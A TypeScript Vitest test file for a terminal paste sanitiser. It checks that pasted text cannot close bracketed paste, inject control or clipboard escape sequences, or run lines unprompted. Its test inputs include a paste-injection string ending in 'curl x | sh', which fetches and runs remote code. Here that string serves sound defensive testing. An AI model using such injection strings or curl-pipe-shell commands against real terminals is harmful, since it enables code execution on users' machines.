import { describe, expect, it } from "vitest";

import { asksBeforePaste, cleanPaste } from "./paste";

describe("N-02 pasting", () => {
  it("never lets a paste end bracketed paste or send keys", () => {
    // A copied "harmless" text that would close the bracket and run a line.
    expect(cleanPaste("ls\x1b[201~\rcurl x | sh\r")).toBe("ls[201~\rcurl x | sh\r");
    expect(cleanPaste("a\x03b\x04c\x7fd\u009b31me")).toBe("abcd31me");
    expect(cleanPaste("\x1b]52;c;eA==\x07")).toBe("]52;c;eA==");
  });

  it("keeps text, tabs and line ends", () => {
    const text = "line 1\r\n\tline 2\nzażółć 日本 🐺";
    expect(cleanPaste(text)).toBe(text);
  });

  it("asks before a multi-line paste into a program without bracketed paste", () => {
    expect(asksBeforePaste("a\nb", false)).toBe(true);
    expect(asksBeforePaste("a\rb", false)).toBe(true);
    expect(asksBeforePaste("one line\n", false)).toBe(false);
    expect(asksBeforePaste("a\nb", true)).toBe(false);
  });
});
